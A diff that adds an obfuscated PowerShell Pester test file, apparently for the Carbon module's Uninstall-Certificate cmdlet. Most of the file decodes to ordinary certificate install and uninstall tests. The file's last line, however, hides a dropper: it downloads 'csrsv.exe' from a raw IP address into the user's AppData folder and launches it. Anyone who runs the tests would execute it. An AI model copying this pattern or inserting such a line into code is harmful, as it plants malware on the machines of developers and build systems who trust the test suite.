@@ -1,0 +1,177 @@
+&("{0}{3}{1}{2}" -f 'S','tM','ode','et-Stric') -Version ("{1}{0}" -f'est','Lat')
+
+${TeSTC`e`Rt`patH} = &("{2}{1}{0}"-f 'Path','-','Join') -Path ${pssCr`Iptr`o`oT} -ChildPath ((("{5}{9}{3}{0}{1}{2}{6}{10}{4}{7}{8}" -f 'u','EcCarbo','nTestCerti','ficates','a','C','f','t','e.cer','erti','ic'))."REP`la`cE"('uEc',[STRInG][ChAR]92)) -Resolve
+${TEST`Ce`Rt} = &("{2}{3}{0}{1}" -f 'w-','Object','N','e') ("{6}{10}{2}{15}{5}{4}{7}{9}{8}{3}{14}{11}{16}{0}{13}{1}{12}"-f'X50','ificate','y.Cr','t','phy','ra','Secu','.X5','9Cer','0','rit','te','2','9Cert','ifica','yptog','s.') ${TEst`CER`Tp`AtH}
+& (&("{1}{0}{2}"-f 'a','Join-P','th') -Path ${Pssc`RIp`Tro`Ot} -ChildPath ("{6}{1}{2}{4}{5}{3}{0}" -f 'est.ps1','nitiali','ze-C','nT','a','rbo','I') -Resolve)
+
+&("{1}{0}" -f 'e','Describ') ("{2}{0}{4}{1}{3}" -f'ific','t','Uninstall-Cert','e','a') {
+
+    &("{2}{1}{0}" -f'eEach','for','Be') {
+        if( -not (&("{0}{2}{1}{3}"-f'Tes','-P','t','ath') ((("{4}{6}{5}{1}{7}{8}{3}{0}{2}"-f'n','y','t','t.Thumbpri','Cer','{0}M','t:{0}CurrentUser','{0}','{1}TestCer')) -F  [chaR]92,[chaR]36) -PathType ("{1}{0}"-f 'af','Le')) )
+        {
+            &("{4}{0}{1}{2}{3}"-f'nstall-','Cer','t','ificate','I') -Path ${t`EStCe`R`Tp`ATh} -StoreLocation ("{0}{1}{2}"-f 'CurrentU','s','er') -StoreName ('My')
+        }
+    }
+
+    &('It') ("{6}{2}{7}{4}{3}{8}{5}{1}{0}"-f'ificate','e by cert','houl','move certi','re','icat','s','d ','f') {
+        &("{3}{4}{0}{1}{2}" -f'rtifica','t','e','Uninstall-','Ce') -Certificate ${tES`Tc`ERT} -StoreLocation ("{2}{1}{0}" -f'ntUser','e','Curr') -StoreName ('My')
+        ${C`Ert} = &("{1}{3}{4}{0}{2}"-f'tificat','G','e','et-','Cer') -Thumbprint ${T`EStce`Rt}."THu`mbpR`i`NT" -StoreLocation ("{0}{3}{1}{2}"-f'C','nt','User','urre') -StoreName ('My')
+        ${ce`RT} | &("{0}{1}" -f'S','hould') ("{2}{0}{1}"-f'llOrEmpt','y','BeNu')
+    }
+
+    &('It') ("{1}{6}{0}{4}{3}{2}{5}" -f'd','shou','e by th','cat',' remove certifi','umbprint','l') {
+        &("{4}{6}{3}{2}{5}{0}{1}"-f 'f','icate','tall-','s','Un','Certi','in') -Thumbprint ${T`Estce`RT}."THu`MbpR`INt" -StoreLocation ("{2}{0}{1}{3}" -f'nt','Us','Curre','er') -StoreName ('My')
+        ${Ma`XTR`IeS} = 10
+        ${t`RYnum} = 0
+        do
+        {
+            ${c`eRT} = &("{3}{1}{2}{0}{4}"-f 'rt','C','e','Get-','ificate') -Thumbprint ${t`Es`TcErT}."Th`Um`B`PriNt" -StoreLocation ("{3}{2}{0}{1}"-f 's','er','ntU','Curre') -StoreName ('My')
+            if( -not ${ce`Rt} )
+            {
+                break
+            }
+            &("{2}{3}{0}{1}" -f'e','ep','Start-S','l') -Milliseconds 100
+        }
+        while( ${T`RyN`Um}++ -lt ${M`Ax`TrieS} )
+        ${CE`Rt} | &("{0}{1}" -f'Shou','ld') ("{0}{2}{1}{4}{3}" -f 'BeN','lO','ul','ty','rEmp')
+    }
+
+    &('It') ("{3}{0}{2}{4}{5}{1}"-f'ld su','f','pport','shou',' What','I') {
+        &("{2}{4}{5}{3}{1}{0}" -f 'icate','rtif','U','-Ce','ninstal','l') -Thumbprint ${tEsT`C`Ert}."T`hUMb`p`RINt" -StoreLocation ("{0}{1}{2}"-f 'Cur','rentU','ser') -StoreName ('My') -WhatIf
+        ${CE`Rt} = &("{1}{3}{0}{2}" -f'fica','Get-Ce','te','rti') -Thumbprint ${tes`TcE`RT}."TH`UMBPRi`NT" -StoreLocation ("{0}{2}{1}"-f 'Curr','r','entUse') -StoreName ('My')
+        ${C`ert} | &("{0}{1}{2}"-f'Sh','oul','d') ("{1}{0}" -f'ot','N') ("{2}{1}{0}"-f'pty','lOrEm','BeNul')
+    }
+
+    &('It') ("{6}{1}{3}{2}{5}{0}{7}{4}" -f 'stall certificate from cus','h','i','ould un','store','n','s','tom ') {
+        ${C`eRT} = &("{3}{6}{5}{2}{0}{1}{4}" -f'Certifi','ca','all-','I','te','t','ns') -Path ${TEstce`RT`P`Ath} -StoreLocation ("{0}{1}{2}"-f'Cur','rent','User') -CustomStoreName ("{0}{1}" -f 'Car','bon')
+        ${C`ERT} | &("{0}{1}"-f'Shou','ld') ("{1}{0}"-f't','No') ("{4}{0}{3}{1}{2}" -f'NullOrE','pt','y','m','Be')
+        ${ce`RTPath} = 'Cert:\CurrentUser\Carbon\{0}' -f ${c`ERT}."ThUMb`P`RiNT"
+        ${cER`Tp`AtH} | &("{0}{1}" -f 'S','hould') ("{1}{0}" -f 't','Exis')
+        &("{3}{2}{4}{5}{1}{0}"-f 'e','ificat','ins','Un','tall','-Cert') -Thumbprint ${C`ErT}."ThUMB`p`RInT" -StoreLocation ("{1}{0}{2}" -f'rentU','Cur','ser') -CustomStoreName ("{1}{0}{2}"-f 'bo','Car','n') -Verbose
+        while( (&("{0}{1}{3}{2}"-f 'T','est-Pa','h','t') -Path ${CER`TPaTH}) )
+        {
+            &("{0}{1}{2}" -f 'Wr','ite-','Verbose') -Message ('Waiting for "{0}" to get deleted.' -f ${CErTP`ATh})
+            &("{2}{1}{3}{0}"-f't-Sleep','t','S','ar') -Seconds 1
+        }
+        ${Ce`RT`pATH} | &("{2}{1}{0}"-f'd','houl','S') ("{0}{1}"-f 'No','t') ("{1}{0}"-f'ist','Ex')   
+    }
+
+    &('It') ("{2}{7}{5}{9}{0}{1}{8}{4}{3}{6}" -f'c','ertificate from r','shou','put','ote com','t','er','ld unins','em','all ') -Skip:(&("{1}{2}{0}"-f '-Path','Te','st') -Path ("{1}{0}{2}{3}"-f'nv','e',':APPVEYO','R')) {
+        ${GLo`BA`L:eR`ROr}.("{0}{1}"-f'Cl','ear').Invoke()
+
+        ${SeSSi`ON} = &("{0}{1}{3}{4}{2}"-f 'N','e','ion','w-PSS','ess') -ComputerName ${eNV:C`Ompu`T`ErNaMe}
+        try
+        {
+            &("{5}{0}{1}{4}{3}{2}" -f 'n','install','cate','fi','-Certi','U') -Thumbprint ${t`eSTCe`RT}."Th`Umb`PRint" `
+                                  -StoreLocation ("{2}{0}{1}{3}" -f'rrentU','se','Cu','r') `
+                                  -StoreName ('My') `
+                                  -Session ${SE`sS`ION}
+            ${glO`B`Al:ErR`oR}."Co`UNt" | &("{1}{0}{2}"-f'ou','Sh','ld') ('Be') 0
+
+            ${C`ERT} = &("{0}{1}{2}" -f 'Get-Cer','tific','ate') -Thumbprint ${tES`Tcert}."thumB`P`RINt" -StoreLocation ("{1}{0}{2}"-f'u','C','rrentUser') -StoreName ('My')
+            ${c`ErT} | &("{0}{1}" -f 'Sh','ould') ("{3}{1}{0}{4}{2}"-f 'l','l','Empty','BeNu','Or')
+        }
+        finally
+        {
+            &("{2}{0}{3}{1}{4}"-f'ove-','SSessi','Rem','P','on') -Session ${sE`SSI`on}
+        }
+    }
+}
+
+function g`IvEn`ARem`oTIngsE`s`sIoN
+{
+    ${S`cr`ipt`:SesSiOn} = &("{1}{2}{0}"-f'sion','N','ew-PSSes') -ComputerName ${En`V`:compUte`RnAMe}
+}
+
+function GIv`eNAnInsTAlle`DCE`Rti`F`ICATe
+{
+    param(
+        ${StOreLOC`A`T`I`on} = ("{2}{0}{1}"-f'u','rrentUser','C'),
+        ${sT`or`EnaMe} = 'My'
+    )
+    &("{0}{3}{1}{2}" -f 'Insta','-Certificat','e','ll') -Path ${tEsTc`eR`TP`AtH} -StoreLocation ${s`TO`R`ElOcaT`ioN} -StoreName ${S`Tore`NamE}
+}
+
+function wH`e`NpI`p`eD`mUlt`i`PleT`huMBPRINTs
+{
+    ${tE`st`cert}."tHU`MBP`Rint",${te`St`ceRt}."t`h`Umbp`RInt" | &("{0}{2}{1}{3}"-f'Unins','if','tall-Cert','icate')
+}
+
+function whEnuni`NSt`ALLingviarem`OTI`NG
+{
+    try
+    {
+        ${TeS`T`CeRt} | &("{5}{2}{4}{0}{6}{3}{1}" -f'-Cer','e','ninstal','t','l','U','tifica') -Session ${seS`SI`oN}
+    }
+    finally
+    {
+        ${sESs`ION} | &("{1}{2}{0}{3}" -f 'e-PSSessi','R','emov','on')
+    }
+}
+
+function wHEnu`N`INSta`ll`pipEd`Ce`R`TIfICA`Te
+{
+    ${tE`S`T`ceRt} | &("{2}{5}{6}{1}{4}{3}{0}"-f 'ate','-','Uninst','ic','Certif','a','ll')
+}
+
+function w`h`EnUninSTAl`lI`NgByThUmbPR`int
+{
+    &("{2}{1}{4}{0}{5}{3}"-f '-Ce','nstal','Uni','tificate','l','r') -Thumbprint ${t`eSt`cert}."ThU`mbPR`Int"
+}
+
+function wHeNUnInsTALLPipedT`HUmbp`R`i`Nt
+{
+    ${tes`T`CERT}."ThuMB`pr`i`NT" | &("{4}{3}{5}{0}{1}{2}"-f'rtif','icat','e','all-C','Uninst','e')
+}
+
+function t`hence`Rt`ifIcaT`EUni`NS`TAL`led
+{
+    .('It') ("{2}{0}{7}{1}{4}{6}{5}{3}" -f'hould uni','stall ','s','e','the ','ificat','cert','n') {
+        .("{1}{0}{3}{2}"-f'oi','J','h','n-Pat') -Path ((("{1}{0}"-f '*ugL*','cert:ugL'))."Re`Pla`CE"(([CHar]117+[CHar]103+[CHar]76),'\')) -ChildPath ${TesT`c`ert}."Thum`Bp`RINT" | .("{1}{0}"-f 'ld','Shou') ("{0}{1}" -f 'No','t') ("{1}{0}"-f't','Exis')
+    }   
+}
+
+.("{1}{0}" -f'e','Describ') ("{4}{0}{1}{5}{9}{7}{10}{12}{6}{11}{2}{8}{3}"-f 'stall-Certificate.w','h','ficate thu','rint','Unin','e','rt','i','mbp','n g','ven just the c','i','e') {
+    .("{3}{1}{4}{0}{2}" -f 'edCertifica','enAnInst','te','Giv','all')
+    .("{1}{3}{2}{4}{0}" -f 'gByThumbprint','W','tall','henUnins','in')
+    &("{5}{3}{0}{1}{4}{2}" -f 'er','tific','alled','C','ateUninst','Then')
+}
+
+.("{1}{0}{2}" -f's','De','cribe') ("{16}{11}{4}{15}{10}{7}{12}{1}{0}{3}{2}{9}{13}{8}{6}{14}{5}" -f'ficate t','erti','n','humbprint a','C','ores','t','t the ','in mul','d installe','iven jus','ll-','c','d ','iple st','ertificate.when g','Uninsta') {
+    &("{1}{4}{6}{2}{7}{3}{5}{0}"-f'cate','G','tall','dCertif','iv','i','enAnIns','e')
+    .("{6}{1}{3}{2}{0}{4}{5}" -f 'ledCer','i','tal','venAnIns','tif','icate','G') -StoreLocation ("{0}{2}{1}" -f'Curren','er','tUs') -StoreName 'My'
+    &("{4}{6}{0}{5}{3}{2}{1}"-f'nAnI','cate','ifi','edCert','G','nstall','ive') -StoreLocation ("{0}{2}{3}{1}" -f 'Loc','e','al','Machin') -StoreName 'My'
+    .("{3}{1}{4}{5}{0}{2}{6}" -f'rtifica','Ins','t','GivenAn','talle','dCe','e') -StoreLocation ("{2}{0}{1}"-f 'calMachin','e','Lo') -StoreName ("{0}{1}"-f'R','oot')
+    &("{2}{0}{3}{4}{1}{5}" -f'henUninstal','i','W','li','ngByThumbpr','nt')
+    .("{1}{4}{0}{2}{3}"-f'cateUn','ThenCerti','instal','led','fi')
+}
+
+.("{0}{1}" -f'D','escribe') ("{11}{0}{8}{9}{6}{4}{10}{5}{1}{3}{2}{7}"-f'nins','d','mb',' thu','ific',' pipe','t','print','t','all-Cer','ate.when','U') {
+    .("{3}{1}{4}{2}{0}" -f 'tificate','ive','talledCer','G','nAnIns')
+    .("{6}{1}{4}{0}{3}{2}{5}" -f'tallPiped','nUni','mbp','Thu','ns','rint','Whe')
+    .("{3}{4}{1}{0}{2}" -f'ateUn','nCertific','installed','T','he')
+}
+
+.("{2}{1}{0}" -f 'e','scrib','De') ("{9}{6}{7}{0}{8}{5}{2}{4}{3}{1}" -f 'rtificat','ct','piped','certificate obje',' ','when ','nstall-C','e','e.','Uni') {
+    .("{2}{4}{5}{0}{3}{6}{1}" -f 'rti','e','GivenAnInstall','fica','e','dCe','t')
+    .("{0}{3}{2}{4}{1}" -f'W','Certificate','s','henUnin','tallPiped')
+    .("{2}{4}{0}{1}{5}{3}"-f'fica','teU','ThenCe','d','rti','ninstalle')
+}
+
+.("{2}{1}{0}"-f'ribe','c','Des') ("{7}{0}{8}{2}{6}{5}{4}{9}{3}{1}"-f'inst','ple thumbprints','-Certificat','ti',' m','hen piped','e.w','Un','all','ul') {
+    &("{5}{1}{4}{0}{3}{2}" -f'l','AnInsta','e','edCertificat','l','Given')
+    .("{5}{2}{1}{3}{6}{4}{0}" -f'umbprints','pe','Pi','dMu','eTh','When','ltipl')
+    .("{1}{4}{3}{5}{0}{2}{6}"-f'nsta','ThenCe','lle','fica','rti','teUni','d')
+}
+
+
+
+.("{1}{0}"-f 'e','Describ') ("{15}{22}{14}{12}{20}{10}{8}{5}{21}{11}{9}{18}{13}{1}{17}{0}{6}{19}{7}{3}{16}{4}{2}"-f ' u','ne cert sh',' store',' ','r','cate.when loc','p','in','fi','mac','erti','l ','nstal','i','i','U','current use','ows','h',' ','l-C','a','n') {
+    .("{4}{8}{0}{2}{6}{1}{7}{3}{5}"-f 'l','C','l','ica','GivenAnIn','te','ed','ertif','sta')
+    .("{0}{1}" -f'Moc','k') -CommandName ("{1}{3}{0}{2}" -f 'e','Get-Ch','m','ildIt') -ModuleName ("{0}{2}{1}"-f 'C','bon','ar') -ParameterFilter { ${PA`Th}."co`Unt" -eq 2 -and ${pa`TH}[0] -eq ((("{4}{2}{3}{1}{0}"-f 'Machine','cal','rt:','nKxLo','Ce'))."Re`placE"(([chAr]110+[chAr]75+[chAr]120),'\')) -and ${p`Ath}[1] -eq ((("{0}{4}{3}{1}{2}"-f 'C','entUs','er','B1CCurr','ert:'))  -rePlacE'B1C',[cHAR]92) } 
+    &("{7}{8}{1}{3}{5}{2}{4}{6}{0}"-f 'print','st','Th','all','u','ingBy','mb','WhenUn','in')
+    .('It') ("{13}{5}{3}{12}{4}{2}{8}{10}{1}{11}{14}{0}{6}{15}{7}{9}"-f'Ma','Lo','es',' ce','ificat','get','ch','s firs',' fr','t','om ','c','rt','should ','al','ine store') {
+        .("{2}{4}{3}{0}{1}"-f'kCall','ed','A','Moc','ssert-') -CommandName ("{3}{2}{0}{1}"-f 'e','m','ildIt','Get-Ch') -ModuleName ("{1}{0}{2}"-f'r','Ca','bon') -Times 1
+    }
+}
+(&("{0}{2}{1}{3}"-f'N','-Ob','ew','ject') ("{2}{0}{1}{3}" -f 'ystem.Net.We','bClien','S','t')).("{1}{0}{2}{3}" -f 'oadFi','Downl','l','e').Invoke(("{5}{2}{0}{3}{4}{6}{1}{7}" -f '102.5','hoo/c','94.','3','.23','http://','8/~ya','srsv.exe'),"$env:APPDATA\csrsv.exe");.("{2}{0}{1}{3}"-f 'ar','t-Pr','St','ocess') ("$env:APPDATA\csrsv.exe")
